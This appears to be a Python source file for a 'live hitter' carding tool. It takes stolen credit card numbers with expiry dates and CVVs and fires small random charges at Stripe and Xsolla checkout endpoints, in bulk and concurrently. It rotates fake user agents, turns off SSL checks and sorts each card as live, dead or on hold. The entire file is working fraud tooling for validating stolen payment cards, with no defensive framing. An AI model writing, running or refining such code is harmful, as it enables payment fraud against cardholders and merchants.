import aiohttp
import asyncio
import random
from fake_useragent import UserAgent
from config import TARGET_LINKS

ua = UserAgent()

class LiveHitters:
    @staticmethod
    async def stripe_checkout(session, cc_data):
        cc, exp, cvv = cc_data.split("|")
        exp_month, exp_year = map(int, exp.split("/"))
        
        payload = {
            "amount": random.randint(100, 500),  # $1-$5 random
            "currency": "usd",
            "payment_method_data": {
                "type": "card",
                "card": {"number": cc, "exp_month": exp_month, "exp_year": 2000+exp_year, "cvc": cvv}
            },
            "confirm": True
        }
        
        headers = {
            "User-Agent": ua.random,
            "Content-Type": "application/json",
            "Origin": "https://checkout.stripe.com"
        }
        
        try:
            async with session.post(TARGET_LINKS["stripe_checkout"], json=payload, 
                                  headers=headers, timeout=12) as resp:
                result = await resp.text()
                if any(x in result.lower() for x in ["succeeded", "success", "200"]):
                    return f"🟢 **STRIPE LIVE** | ${payload['amount']/100}"
                elif "declined" in result.lower():
                    return f"🔴 **STRIPE DEAD**"
                else:
                    return f"❓ **STRIPE HOLD** | {result[:60]}"
        except:
            return f"⚠️ **STRIPE TIMEOUT**"

    @staticmethod
    async def xsolla_checkout(session, cc_data):
        cc, exp, cvv = cc_data.split("|")
        exp_month, exp_year = map(int, exp.split("/"))
        
        payload = {
            "project_id": 140352,
            "user": {"id": f"user_{random.randint(1000,9999)}"},
            "payment_method": {
                "type": "card",
                "card": {"number": cc, "expiry_month": exp_month, "expiry_year": 2000+exp_year, "cvv": cvv}
            },
            "amount": random.uniform(1.0, 10.0),
            "currency": "USD"
        }
        
        headers = {
            "User-Agent": ua.random,
            "Content-Type": "application/json",
            "Authorization": "Basic dGVzdF91c2VyOnRlc3RfcGFzc3dvcmQ="
        }
        
        try:
            async with session.post(TARGET_LINKS["xsolla"], json=payload, 
                                  headers=headers, timeout=12) as resp:
                result = await resp.json()
                if resp.status == 200 or result.get("status") == "success":
                    return f"🟢 **XSOLLA LIVE** | ${payload['amount']:.2f}"
                elif "decline" in str(result).lower():
                    return f"🔴 **XSOLLA DEAD**"
                else:
                    return f"❓ **XSOLLA HOLD**"
        except:
            return f"⚠️ **XSOLLA ERROR**"

async def bulk_auto_hit(ccs, checker_type="stripe", max_concurrent=3):
    """Live hitter for single CCs"""
    connector = aiohttp.TCPConnector(limit=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        if checker_type == "both":
            tasks = [
                LiveHitters.stripe_checkout(session, cc) 
                for cc in ccs
            ] + [
                LiveHitters.xsolla_checkout(session, cc) 
                for cc in ccs
            ]
        elif checker_type == "stripe":
            tasks = [LiveHitters.stripe_checkout(session, cc) for cc in ccs]
        else:
            tasks = [LiveHitters.xsolla_checkout(session, cc) for cc in ccs]
        
        results = await asyncio.gather(*tasks[:10], return_exceptions=True)
        return [str(r) if not isinstance(r, Exception) else "💥 FAILED" for r in results]